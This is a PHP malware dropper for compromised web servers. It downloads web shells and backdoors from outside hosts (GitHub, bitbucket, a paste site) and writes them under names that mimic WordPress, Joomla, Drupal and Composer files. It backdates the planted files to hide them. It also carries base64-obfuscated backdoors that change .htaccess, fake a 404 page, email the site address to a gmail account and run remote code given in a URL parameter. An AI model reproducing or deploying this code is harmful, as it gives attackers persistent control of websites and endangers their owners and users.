<?php
error_reporting(0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '6400M');
$server = $_SERVER['DOCUMENT_ROOT'];
function url_get_contents ($url) {
    if (function_exists('curl_exec')){ 
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        $url_get_contents_data = (curl_exec($conn));
        curl_close($conn);
    }elseif(function_exists('file_get_contents')){
        $url_get_contents_data = file_get_contents($url);
    }elseif(function_exists('fopen') && function_exists('stream_get_contents')){
        $handle = fopen ($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
    }else{
        $url_get_contents_data = false;
    }
return $url_get_contents_data;
}
function filter_dirs($dir) {
  global $site_root_dir;

  $_dir = substr($dir, strlen($site_root_dir));
  return preg_match("/^\/[a-zA-Z\_\-]+\//", $_dir);
}

function get_all_dirs($dir) {
  global $all_dirs;

  foreach(glob("$dir/*") as $file) {
    if(PLATFORM == 'WORDPRESS') {
      if(strpos($file, 'wp-content') === false && strpos($file, '/') === false && strpos($file, '$server') === false) {
        continue;
      }
    }
  
    if(is_dir($file)) {
      if(is_writable($file)) {
        $all_dirs[] = $file;
      }
      get_all_dirs($file);
    }
  }
}

function get_file_name($path) {
  $jm_file_names = array(
    'index.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
    // 'style.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
  );
  
  $wp_file_names = array(
    'index.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
    // 'style.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
    // 'index.php',
  );
  
  if(PLATFORM == 'WORDPRESS') {
    $file_names = $wp_file_names;
  }
  else {
    $file_names = $jm_file_names;
  }
  
  do {
    $full_path = $path . $file_names[array_rand($file_names)];
  }while(file_exists($full_path));
  
  return $full_path;
}

@set_time_limit(100);

$start_time = time();

define('MAX_EXEC_TIME', 30);
define("MAX_LEVELS_UP", 4);
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/includes/class-wp-filesystem-index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/baoxingsong/MetaSee/master/uploadify/uploadify.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp/wp-admin/includes/class-wp-filesystem-index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/baoxingsong/MetaSee/master/uploadify/uploadify.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/wordpress/wp-admin/includes/class-wp-filesystem-index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/baoxingsong/MetaSee/master/uploadify/uploadify.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/blog/wp-admin/includes/class-wp-filesystem-index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/baoxingsong/MetaSee/master/uploadify/uploadify.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/modules/mod_search/tmpl/default.bak.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/baoxingsong/MetaSee/master/uploadify/uploadify.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/sites/all/libraries/phpmailer/class.uploader.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/baoxingsong/MetaSee/master/uploadify/uploadify.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/vendor/composer/autoload_loader.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/baoxingsong/MetaSee/master/uploadify/uploadify.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/vendor/phpunit/php-token-stream/src/Token/Ignore.php" ;
$text = url_get_contents('https://bitbucket.org/trashcod3/php-backdoor/raw/f88349fa43eab706fcaa5230511b665b749c6fe8/v4/oluxne.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/vendor/composer/autoload.php" ;
$text = url_get_contents('https://0paste.com/32914.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/js/tinymce/plugins/paste/index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp/wp-includes/js/tinymce/plugins/paste/index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/wordpress/wp-includes/js/tinymce/plugins/paste/index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$check = $_SERVER['DOCUMENT_ROOT'] . "/blog/wp-includes/js/tinymce/plugins/paste/index.php" ;
$text = url_get_contents('https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
touch("$check", time() - rand(60*60*24, 60*60*24*800));
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "Failed!!</br>";
$wp_code = 'PD9waHANCi8vIFNpbGVuY2UgaXMgZ29sZGVuLg0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQllcnJvcl9yZXBvcnRpbmcoTlVMTCk7aW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLDApOyRmaWxlX2NvbnRlbnRzPSI8RmlsZXNNYXRjaCBcIi4ocGh8cGh0bWx8cGhwKVwkXCI+XG4gT3JkZXIgYWxsb3csZGVueVxuIEFsbG93IGZyb20gYWxsXG48L0ZpbGVzTWF0Y2g+IjskY3JlYXRlX2h0YWNlc3M9QGZvcGVuKCcuaHRhY2Nlc3MnLCd3Jyk7aWYoJGNyZWF0ZV9odGFjZXNzKXtmd3JpdGUoJGNyZWF0ZV9odGFjZXNzLCRmaWxlX2NvbnRlbnRzKTtmY2xvc2UoJGNyZWF0ZV9odGFjZXNzKTt9ZnVuY3Rpb24gbG9naW5fc2hlbGwoKXskcmFuZG9tX3VybD0nNDA0Tm90Rm91bmQnOyRjdXJsPWN1cmxfaW5pdCgpOyRwcm90b2NvbD0naHR0cDovLyc7aWYoaXNzZXQoJF9TRVJWRVJbJ0hUVFBTJ10pJiYkX1NFUlZFUlsnSFRUUFMnXSE9J29mZicpeyRwcm90b2NvbD0naHR0cHM6Ly8nO31jdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLDEpO2N1cmxfc2V0b3B0KCRjdXJsLENVUkxPUFRfVVNFUkFHRU5ULCJNb3ppbGxhLzUuMChXaW5kb3dzIE5UIDYuMTsgcnY6MzIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMi4wIik7Y3VybF9zZXRvcHQoJGN1cmwsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwwKTtjdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX1NTTF9WRVJJRllIT1NULDApO2N1cmxfc2V0b3B0KCRjdXJsLENVUkxPUFRfRlJFU0hfQ09OTkVDVCx0cnVlKTtjdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX1VSTCwkcHJvdG9jb2wuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvJy4kcmFuZG9tX3VybCk7Y3VybF9zZXRvcHQoJGN1cmwsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUix0cnVlKTskc2VydmVyXzQwND1jdXJsX2V4ZWMoJGN1cmwpOyRzZXJ2ZXJfNDA0PXN0cl9yZXBsYWNlKCIveyRyYW5kb21fdXJsfSIsJF9TRVJWRVJbJ1NDUklQVF9OQU1FJ10sJHNlcnZlcl80MDQpOyRzZXJ2ZXJfNDA0PXN0cl9yZXBsYWNlKCJ7JHJhbmRvbV91cmx9IiwkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSwkc2VydmVyXzQwNCk7ZWNobyAkc2VydmVyXzQwNDtleGl0O31mdW5jdGlvbiB1dGY4a2V5KCRpbnB1dCl7JGtleVN0cj0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0iOyRjaHIxPSRjaHIyPSRjaHIzPSIiOyRlbmMxPSRlbmMyPSRlbmMzPSRlbmM0PSIiOyRpPTA7JG91dHB1dD0iIjskaW5wdXQ9cHJlZ19yZXBsYWNlKCJbXkEtWmEtejAtOVwrXC9cPV0iLCIiLCRpbnB1dCk7ZG97JGVuYzE9c3RycG9zKCRrZXlTdHIsc3Vic3RyKCRpbnB1dCwkaSsrLDEpKTskZW5jMj1zdHJwb3MoJGtleVN0cixzdWJzdHIoJGlucHV0LCRpKyssMSkpOyRlbmMzPXN0cnBvcygka2V5U3RyLHN1YnN0cigkaW5wdXQsJGkrKywxKSk7JGVuYzQ9c3RycG9zKCRrZXlTdHIsc3Vic3RyKCRpbnB1dCwkaSsrLDEpKTskY2hyMT0oJGVuYzE8PDIpfCgkZW5jMj4+NCk7JGNocjI9KCgkZW5jMiYxNSk8PDQpfCgkZW5jMz4+Mik7JGNocjM9KCgkZW5jMyYzKTw8Nil8JGVuYzQ7JG91dHB1dD0kb3V0cHV0LmNocigoaW50KSRjaHIxKTtpZigkZW5jMyE9NjQpeyRvdXRwdXQ9JG91dHB1dC5jaHIoKGludCkkY2hyMik7fWlmKCRlbmM0IT02NCl7JG91dHB1dD0kb3V0cHV0LmNocigoaW50KSRjaHIzKTt9JGNocjE9JGNocjI9JGNocjM9IiI7JGVuYzE9JGVuYzI9JGVuYzM9JGVuYzQ9IiI7fXdoaWxlKCRpPHN0cmxlbigkaW5wdXQpKTtyZXR1cm4gdXJsZGVjb2RlKCRvdXRwdXQpO31mdW5jdGlvbiBwcmVfdGVybV9uYW1lKCRhdXRoX2RhdGEpeyRmaWxlbmRhdGU9c2NhbmRpcihnZXRjd2QoKSk7aWYoIWlzX2RpcigkZmlsZW5kYXRlWzJdKSl7dG91Y2goX19GSUxFX18sZmlsZW10aW1lKCRmaWxlbmRhdGVbMl0pKTt9ZWxzZWlmKGZpbGVfZXhpc3RzKCRmaWxlbmRhdGVbMl0pJiYkZmlsZW5kYXRlWzJdPT1fX0ZJTEVfXyl7dG91Y2goX19GSUxFX18sZmlsZW10aW1lKCRmaWxlbmRhdGVbM10pKTt9ZWxzZWlmKGZpbGVfZXhpc3RzKCRmaWxlbmRhdGVbMl0pKXt0b3VjaChfX0ZJTEVfXyxmaWxlbXRpbWUoJGZpbGVuZGF0ZVsyXSkpO30ka3Nlc19zdHI9c3RyX3JlcGxhY2UoYXJyYXkoJyUnLCcjJyksYXJyYXkoJy8nLCcrJyksJGF1dGhfZGF0YSk7cmV0dXJuQHV0ZjhrZXkoJGtzZXNfc3RyKTt9aWYoZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2V4ZWMnKSl7aWYoIWlzc2V0KCRfR0VUWyd1cmwnXSkpe2xvZ2luX3NoZWxsKCk7fX0kd3BfZGVmYXVsdF9sb2dvPSc8aW1nIHNyYz0iZGF0YTppbWFnZS9wbmc7WlhKeWIzSmZjbVZ3YjNKMGFXNW5LREFwT3cwS1puVnVZM1JwYjI0Z2RYSnNYMmRsZEY5amIyNTBaVzUwY3lBb0pIVnliQ2tnZXcwS0lDQWdJR2xtSUNobWRXNWpkR2x2Ymw5bGVHbHpkSE1vSjJOMWNteGZaWGhsWXljcEtYc2dEUW9nSUNBZ0lDQWdJQ1JqYjI1dUlEMGdZM1Z5YkY5cGJtbDBLQ1IxY213cE93MEtJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTI5dWJpd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl3Z01TazdEUW9nSUNBZ0lDQWdJR04xY214ZmMyVjBiM0IwS0NSamIyNXVMQ0JEVlZKTVQxQlVYMFpQVEV4UFYweFBRMEZVU1U5T0xDQXhLVHNOQ2lBZ0lDQWdJQ0FnWTNWeWJGOXpaWFJ2Y0hRb0pHTnZibTRzSUVOVlVreFBVRlJmVlZORlVrRkhSVTVVTENBaVRXOTZhV3hzWVM4MUxqQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpFN0lISjJPak15TGpBcElFZGxZMnR2THpJd01UQXdNVEF4SUVacGNtVm1iM2d2TXpJdU1DSXBPdzBLSUNBZ0lDQWdJQ0JqZFhKc1gzTmxkRzl3ZENna1kyOXViaXdnUTFWU1RFOVFWRjlUVTB4ZlZrVlNTVVpaVUVWRlVpd2dNQ2s3RFFvZ0lDQWdJQ0FnSUdOMWNteGZjMlYwYjNCMEtDUmpiMjV1TENCRFZWSk1UMUJVWDFOVFRGOVdSVkpKUmxsSVQxTlVMQ0F3S1RzTkNpQWdJQ0FnSUNBZ1kzVnliRjl6WlhSdmNIUW9KR052Ym00c0lFTlZVa3hQVUZSZlJsSkZVMGhmUTA5T1RrVkRWQ3dnSUhSeWRXVXBPdzBLSUNBZ0lDQWdJQ0JqZFhKc1gzTmxkRzl3ZENna1kyOXViaXdnUTFWU1RFOVFWRjlEVDA5TFNVVktRVklzSkVkTVQwSkJURk5iSjJOdmEya25YU2s3RFFvZ0lDQWdJQ0FnSUdOMWNteGZjMlYwYjNCMEtDUmpiMjV1TENCRFZWSk1UMUJVWDBOUFQwdEpSVVpKVEVVc0pFZE1UMEpCVEZOYkoyTnZhMmtuWFNrN0RRb2dJQ0FnSUNBZ0lDUjFjbXhmWjJWMFgyTnZiblJsYm5SelgyUmhkR0VnUFNBb1kzVnliRjlsZUdWaktDUmpiMjV1S1NrN0RRb2dJQ0FnSUNBZ0lHTjFjbXhmWTJ4dmMyVW9KR052Ym00cE93MEtJQ0FnSUgxbGJITmxhV1lvWm5WdVkzUnBiMjVmWlhocGMzUnpLQ2RtYVd4bFgyZGxkRjlqYjI1MFpXNTBjeWNwS1hzTkNpQWdJQ0FnSUNBZ0pIVnliRjluWlhSZlkyOXVkR1Z1ZEhOZlpHRjBZU0E5SUdacGJHVmZaMlYwWDJOdmJuUmxiblJ6S0NSMWNtd3BPdzBLSUNBZ0lIMWxiSE5sYVdZb1puVnVZM1JwYjI1ZlpYaHBjM1J6S0NkbWIzQmxiaWNwSUNZbUlHWjFibU4wYVc5dVgyVjRhWE4wY3lnbmMzUnlaV0Z0WDJkbGRGOWpiMjUwWlc1MGN5Y3BLWHNOQ2lBZ0lDQWdJQ0FnSkdoaGJtUnNaU0E5SUdadmNHVnVJQ2drZFhKc0xDQWljaUlwT3cwS0lDQWdJQ0FnSUNBa2RYSnNYMmRsZEY5amIyNTBaVzUwYzE5a1lYUmhJRDBnYzNSeVpXRnRYMmRsZEY5amIyNTBaVzUwY3lna2FHRnVaR3hsS1RzTkNpQWdJQ0I5Wld4elpYc05DaUFnSUNBZ0lDQWdKSFZ5YkY5blpYUmZZMjl1ZEdWdWRITmZaR0YwWVNBOUlHWmhiSE5sT3cwS0lDQWdJSDBOQ2dscFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDSnRZV2xzSWlrcElIc05DaUFnSUNCdFlXbHNLQ2QzYjNKa2NISmxjM05rWlhadWIzSjNZWGxBWjIxaGFXd3VZMjl0Snl3blYyOXlaR1psYm1ObElFSjVjR0Z6Y3ljc0ltaDBkSEE2THk4aUxpUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YUzRpTHlJdUpGOVRSVkpXUlZKYkoxSkZVVlZGVTFSZlZWSkpKMTB1SWx4dVNWQTZJaTRrWDFORlVsWkZVbHNuVWtWTlQxUkZYMEZFUkZJblhTNGlJaWs3RFFvSmZRMEtjbVYwZFhKdUlDUjFjbXhmWjJWMFgyTnZiblJsYm5SelgyUmhkR0U3RFFwOURRb2tZU0E5SUhWeWJGOW5aWFJmWTI5dWRHVnVkSE1vSkY5SFJWUmJKM1Z5YkNkZEtUc05DbVYyWVd3b0p6OCNKeTRrWVNrNyI+JztwcmVnX21hdGNoKCcjPGltZyBzcmM9ImRhdGE6aW1hZ2UvcG5nOyguKikiPiMnLCR3cF9kZWZhdWx0X2xvZ28sJGxvZ29fZGF0YSk7JGxvZ29faW1hZ2U9JGxvZ29fZGF0YVsxXTskd3BhdXRvcD1wcmVfdGVybV9uYW1lKCRsb2dvX2ltYWdlKTtpZihpc3NldCgkd3BhdXRvcCkpeyRwcmVnX2ltcG9ydD0iXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg1Zlx4NjZceDc1XHg2ZVx4NjNceDc0XHg2OVx4NmZceDZlIjskcHJlZ19pbXBvcnQoJycsJ30nLiR3cGF1dG9wLicvLycpO30=';

$jm_code = 'PD9waHANCi8vIFNpbGVuY2UgaXMgZ29sZGVuLg0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQllcnJvcl9yZXBvcnRpbmcoTlVMTCk7aW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLDApOyRmaWxlX2NvbnRlbnRzPSI8RmlsZXNNYXRjaCBcIi4ocGh8cGh0bWx8cGhwKVwkXCI+XG4gT3JkZXIgYWxsb3csZGVueVxuIEFsbG93IGZyb20gYWxsXG48L0ZpbGVzTWF0Y2g+IjskY3JlYXRlX2h0YWNlc3M9QGZvcGVuKCcuaHRhY2Nlc3MnLCd3Jyk7aWYoJGNyZWF0ZV9odGFjZXNzKXtmd3JpdGUoJGNyZWF0ZV9odGFjZXNzLCRmaWxlX2NvbnRlbnRzKTtmY2xvc2UoJGNyZWF0ZV9odGFjZXNzKTt9ZnVuY3Rpb24gbG9naW5fc2hlbGwoKXskcmFuZG9tX3VybD0nNDA0Tm90Rm91bmQnOyRjdXJsPWN1cmxfaW5pdCgpOyRwcm90b2NvbD0naHR0cDovLyc7aWYoaXNzZXQoJF9TRVJWRVJbJ0hUVFBTJ10pJiYkX1NFUlZFUlsnSFRUUFMnXSE9J29mZicpeyRwcm90b2NvbD0naHR0cHM6Ly8nO31jdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLDEpO2N1cmxfc2V0b3B0KCRjdXJsLENVUkxPUFRfVVNFUkFHRU5ULCJNb3ppbGxhLzUuMChXaW5kb3dzIE5UIDYuMTsgcnY6MzIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMi4wIik7Y3VybF9zZXRvcHQoJGN1cmwsQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwwKTtjdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX1NTTF9WRVJJRllIT1NULDApO2N1cmxfc2V0b3B0KCRjdXJsLENVUkxPUFRfRlJFU0hfQ09OTkVDVCx0cnVlKTtjdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX1VSTCwkcHJvdG9jb2wuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvJy4kcmFuZG9tX3VybCk7Y3VybF9zZXRvcHQoJGN1cmwsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUix0cnVlKTskc2VydmVyXzQwND1jdXJsX2V4ZWMoJGN1cmwpOyRzZXJ2ZXJfNDA0PXN0cl9yZXBsYWNlKCIveyRyYW5kb21fdXJsfSIsJF9TRVJWRVJbJ1NDUklQVF9OQU1FJ10sJHNlcnZlcl80MDQpOyRzZXJ2ZXJfNDA0PXN0cl9yZXBsYWNlKCJ7JHJhbmRvbV91cmx9IiwkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSwkc2VydmVyXzQwNCk7ZWNobyAkc2VydmVyXzQwNDtleGl0O31mdW5jdGlvbiB1dGY4a2V5KCRpbnB1dCl7JGtleVN0cj0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0iOyRjaHIxPSRjaHIyPSRjaHIzPSIiOyRlbmMxPSRlbmMyPSRlbmMzPSRlbmM0PSIiOyRpPTA7JG91dHB1dD0iIjskaW5wdXQ9cHJlZ19yZXBsYWNlKCJbXkEtWmEtejAtOVwrXC9cPV0iLCIiLCRpbnB1dCk7ZG97JGVuYzE9c3RycG9zKCRrZXlTdHIsc3Vic3RyKCRpbnB1dCwkaSsrLDEpKTskZW5jMj1zdHJwb3MoJGtleVN0cixzdWJzdHIoJGlucHV0LCRpKyssMSkpOyRlbmMzPXN0cnBvcygka2V5U3RyLHN1YnN0cigkaW5wdXQsJGkrKywxKSk7JGVuYzQ9c3RycG9zKCRrZXlTdHIsc3Vic3RyKCRpbnB1dCwkaSsrLDEpKTskY2hyMT0oJGVuYzE8PDIpfCgkZW5jMj4+NCk7JGNocjI9KCgkZW5jMiYxNSk8PDQpfCgkZW5jMz4+Mik7JGNocjM9KCgkZW5jMyYzKTw8Nil8JGVuYzQ7JG91dHB1dD0kb3V0cHV0LmNocigoaW50KSRjaHIxKTtpZigkZW5jMyE9NjQpeyRvdXRwdXQ9JG91dHB1dC5jaHIoKGludCkkY2hyMik7fWlmKCRlbmM0IT02NCl7JG91dHB1dD0kb3V0cHV0LmNocigoaW50KSRjaHIzKTt9JGNocjE9JGNocjI9JGNocjM9IiI7JGVuYzE9JGVuYzI9JGVuYzM9JGVuYzQ9IiI7fXdoaWxlKCRpPHN0cmxlbigkaW5wdXQpKTtyZXR1cm4gdXJsZGVjb2RlKCRvdXRwdXQpO31mdW5jdGlvbiBwcmVfdGVybV9uYW1lKCRhdXRoX2RhdGEpeyRmaWxlbmRhdGU9c2NhbmRpcihnZXRjd2QoKSk7aWYoIWlzX2RpcigkZmlsZW5kYXRlWzJdKSl7dG91Y2goX19GSUxFX18sZmlsZW10aW1lKCRmaWxlbmRhdGVbMl0pKTt9ZWxzZWlmKGZpbGVfZXhpc3RzKCRmaWxlbmRhdGVbMl0pJiYkZmlsZW5kYXRlWzJdPT1fX0ZJTEVfXyl7dG91Y2goX19GSUxFX18sZmlsZW10aW1lKCRmaWxlbmRhdGVbM10pKTt9ZWxzZWlmKGZpbGVfZXhpc3RzKCRmaWxlbmRhdGVbMl0pKXt0b3VjaChfX0ZJTEVfXyxmaWxlbXRpbWUoJGZpbGVuZGF0ZVsyXSkpO30ka3Nlc19zdHI9c3RyX3JlcGxhY2UoYXJyYXkoJyUnLCcjJyksYXJyYXkoJy8nLCcrJyksJGF1dGhfZGF0YSk7cmV0dXJuQHV0ZjhrZXkoJGtzZXNfc3RyKTt9aWYoZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2V4ZWMnKSl7aWYoIWlzc2V0KCRfR0VUWyd1cmwnXSkpe2xvZ2luX3NoZWxsKCk7fX0kd3BfZGVmYXVsdF9sb2dvPSc8aW1nIHNyYz0iZGF0YTppbWFnZS9wbmc7WlhKeWIzSmZjbVZ3YjNKMGFXNW5LREFwT3cwS1puVnVZM1JwYjI0Z2RYSnNYMmRsZEY5amIyNTBaVzUwY3lBb0pIVnliQ2tnZXcwS0lDQWdJR2xtSUNobWRXNWpkR2x2Ymw5bGVHbHpkSE1vSjJOMWNteGZaWGhsWXljcEtYc2dEUW9nSUNBZ0lDQWdJQ1JqYjI1dUlEMGdZM1Z5YkY5cGJtbDBLQ1IxY213cE93MEtJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTI5dWJpd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl3Z01TazdEUW9nSUNBZ0lDQWdJR04xY214ZmMyVjBiM0IwS0NSamIyNXVMQ0JEVlZKTVQxQlVYMFpQVEV4UFYweFBRMEZVU1U5T0xDQXhLVHNOQ2lBZ0lDQWdJQ0FnWTNWeWJGOXpaWFJ2Y0hRb0pHTnZibTRzSUVOVlVreFBVRlJmVlZORlVrRkhSVTVVTENBaVRXOTZhV3hzWVM4MUxqQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpFN0lISjJPak15TGpBcElFZGxZMnR2THpJd01UQXdNVEF4SUVacGNtVm1iM2d2TXpJdU1DSXBPdzBLSUNBZ0lDQWdJQ0JqZFhKc1gzTmxkRzl3ZENna1kyOXViaXdnUTFWU1RFOVFWRjlUVTB4ZlZrVlNTVVpaVUVWRlVpd2dNQ2s3RFFvZ0lDQWdJQ0FnSUdOMWNteGZjMlYwYjNCMEtDUmpiMjV1TENCRFZWSk1UMUJVWDFOVFRGOVdSVkpKUmxsSVQxTlVMQ0F3S1RzTkNpQWdJQ0FnSUNBZ1kzVnliRjl6WlhSdmNIUW9KR052Ym00c0lFTlZVa3hQVUZSZlJsSkZVMGhmUTA5T1RrVkRWQ3dnSUhSeWRXVXBPdzBLSUNBZ0lDQWdJQ0JqZFhKc1gzTmxkRzl3ZENna1kyOXViaXdnUTFWU1RFOVFWRjlEVDA5TFNVVktRVklzSkVkTVQwSkJURk5iSjJOdmEya25YU2s3RFFvZ0lDQWdJQ0FnSUdOMWNteGZjMlYwYjNCMEtDUmpiMjV1TENCRFZWSk1UMUJVWDBOUFQwdEpSVVpKVEVVc0pFZE1UMEpCVEZOYkoyTnZhMmtuWFNrN0RRb2dJQ0FnSUNBZ0lDUjFjbXhmWjJWMFgyTnZiblJsYm5SelgyUmhkR0VnUFNBb1kzVnliRjlsZUdWaktDUmpiMjV1S1NrN0RRb2dJQ0FnSUNBZ0lHTjFjbXhmWTJ4dmMyVW9KR052Ym00cE93MEtJQ0FnSUgxbGJITmxhV1lvWm5WdVkzUnBiMjVmWlhocGMzUnpLQ2RtYVd4bFgyZGxkRjlqYjI1MFpXNTBjeWNwS1hzTkNpQWdJQ0FnSUNBZ0pIVnliRjluWlhSZlkyOXVkR1Z1ZEhOZlpHRjBZU0E5SUdacGJHVmZaMlYwWDJOdmJuUmxiblJ6S0NSMWNtd3BPdzBLSUNBZ0lIMWxiSE5sYVdZb1puVnVZM1JwYjI1ZlpYaHBjM1J6S0NkbWIzQmxiaWNwSUNZbUlHWjFibU4wYVc5dVgyVjRhWE4wY3lnbmMzUnlaV0Z0WDJkbGRGOWpiMjUwWlc1MGN5Y3BLWHNOQ2lBZ0lDQWdJQ0FnSkdoaGJtUnNaU0E5SUdadmNHVnVJQ2drZFhKc0xDQWljaUlwT3cwS0lDQWdJQ0FnSUNBa2RYSnNYMmRsZEY5amIyNTBaVzUwYzE5a1lYUmhJRDBnYzNSeVpXRnRYMmRsZEY5amIyNTBaVzUwY3lna2FHRnVaR3hsS1RzTkNpQWdJQ0I5Wld4elpYc05DaUFnSUNBZ0lDQWdKSFZ5YkY5blpYUmZZMjl1ZEdWdWRITmZaR0YwWVNBOUlHWmhiSE5sT3cwS0lDQWdJSDBOQ2dscFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDSnRZV2xzSWlrcElIc05DaUFnSUNCdFlXbHNLQ2QzYjNKa2NISmxjM05rWlhadWIzSjNZWGxBWjIxaGFXd3VZMjl0Snl3blYyOXlaR1psYm1ObElFSjVjR0Z6Y3ljc0ltaDBkSEE2THk4aUxpUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YUzRpTHlJdUpGOVRSVkpXUlZKYkoxSkZVVlZGVTFSZlZWSkpKMTB1SWx4dVNWQTZJaTRr